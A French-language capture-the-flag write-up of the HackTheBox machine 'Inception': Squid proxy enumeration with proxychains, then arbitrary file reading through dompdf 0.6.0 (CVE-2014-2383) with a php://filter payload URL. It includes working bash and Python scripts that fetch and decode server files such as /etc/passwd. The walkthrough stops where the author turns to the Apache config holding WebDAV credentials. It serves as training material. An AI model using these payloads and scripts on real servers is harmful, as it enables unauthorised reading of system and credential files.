![inception](https://i.imgur.com/MScWMDt.png)

Bonjour à tous, aujourd'hui je vous présente une machine notée hard qui été vraiment original et j'ai pris du plaisir à la root : **Inception** de **HackTheBox**. 😃

# Recon

## Nmap 10.10.10.67

```sh
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
```

La machine contient :
  1. Un serveur Apache
  2. Un proxy Squid 

## Enumeration Squid

En utilisant [proxychains](https://github.com/haad/proxychains), nous pouvons tenter de passer par ce proxy sans authentification.

Proxychains fonctionne pour les paquets TCP mais pas UDP, donc pour nmap par exemple si nous voulons scanner à travers un proxy il va falloir rajouter le paramètre **-sT** pour préciser à nmap de faire un **scan TCP** (et non SYN par défaut)

Proxychains va prendre les proxies de haut en bas, deplus il y a plusieurs options :

- **Strict chaining**, proxychains suit obligatoirement le chemin donné dans `/etc/proxychains.conf`
- **Dynamic chaining**, proxychains va d'abord détecter si le proxy est up avant de l'utiliser
- **Random chaining**, tout est dans le nom, il va pas suivre un ordre précis

Pour nous connecter au proxy je vais ajouter ceci à ma configuration proxychains : 

`http	10.10.10.67	3128`

Ensuite nous pouvons tenter un scan nmap sur le localhost du serveur distant (le flag -f nous permet de spécifier le path de notre fichier de configuration) :

```sh
❯ proxychains -f proxychains.conf nmap -sT 127.0.0.1 -Pn
[proxychains] config file found: proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.14
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 14:21 CET
[proxychains] Dynamic chain  ...  10.10.10.67:3128  ...  127.0.0.1:113 <--denied
...
Nmap scan report for localhost (127.0.0.1)
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3128/tcp open  squid-http
```

Nous découvrons un serveur SSH accéssible seulement en local cependant nous pouvons nous y connecter en passant par le proxy.

## Enumeration Web

Un WebDIR nous dévoile un directory /dompdf :

![webdir](https://i.imgur.com/oQlS9iA.png)

Après quelques recherches [dompdf](https://github.com/dompdf/dompdf) est un convertisseur HTML to PDF.

Nous pouvons trouver la version de cette outil dans le fichier /dompdf/VERSION. Nous avons ici **DOMPDF 0.6.0**.

# Foothold + Scripting

```sh
❯ searchsploit dompdf 0.6.0
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                                                                                                | php/webapps/33004.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
❯ searchsploit -m php/webapps/33004.txt
  Exploit: dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/33004
     Path: /usr/share/exploitdb/exploits/php/webapps/33004.txt
❯ cat 33004.txt
Vulnerability title: Arbitrary file read in dompdf
CVE: CVE-2014-2383
Vendor: dompdf
Affected version: v0.6.0

Command line interface:
php dompdf.php
php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>

Web interface:
   
http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>

Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/
```

Avec la [CVE-2014-2383](https://www.exploit-db.com/exploits/33004), nous pouvons lire des fichiers locaux du serveur. Cette vulnérabilité nécessite que le flag de configuration DOMPDF_ENABLE_PHP soit activé (désactivé par défaut).

En utilisant les **PHP Wrappers**, il est possible de contourner la protection "chroot" (DOMPDF_CHROOT) qui empêche dompdf d'accéder aux fichiers système ou d'autres fichiers sur le serveur web. (le flag DOMPDF_ENABLE_REMOTE doit être activé)

J'ai tout d'abord essayé de récupérer le fichier /etc/passwd :

`http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd`

Un fichier PDF est généré et celui ci contient le contenu du fichier demandé en base64. Il suffit de déchiffrer cette chaine :

![etc_passwd_base64](https://i.imgur.com/gokJrZf.png)

Nous avons déjà un utilisateur du nom de :

- cobb

J'ai donc fait un petit script en bash qui permet d'automatiser la procédure de cette vulnérabilité car je n'ai pas trouvé de PoC :

```sh
#!/bin/bash

read -p 'Entrez un fichier : ' file

curl -s http://10.10.10.67:80/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$file -o /tmp/nuts

a=`cat /tmp/nuts`
b=${a#*'[('}
c=${b%%')]'*}
echo $c | base64 -d
```

L'équivalent en python :

```py
import argparse
import urllib.request
import base64

parser = argparse.ArgumentParser()
parser.add_argument("file")
args = parser.parse_args()


u = 'http://10.10.10.67:80/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource='

try:
	request = urllib.request.urlopen(u + args.file)

	output = request.read()
	
	if output:
		contenu = output.decode()
		resultat = contenu[contenu.find("[(")+2:contenu.find(")]")]
		dechiffre = base64.b64decode(resultat).decode('utf8')
		print(dechiffre)

except urllib.error.HTTPError:
	print("Permission Denied for www-data.")
```

Après avoir essayé du **Log Poisoning** ayant **échoué** car nous n'avons pas les droits de lecture sur les logs.
J'ai effectué de nombreuses recherches et j'ai trouvé des informations dans le fichier de configuration du site par défaut d'Apache à partir de `/etc/apache2/sites-enabled/000-default.conf` :

![find_webdav_creds](https://i.imgur.com/bWvOdUu.png)
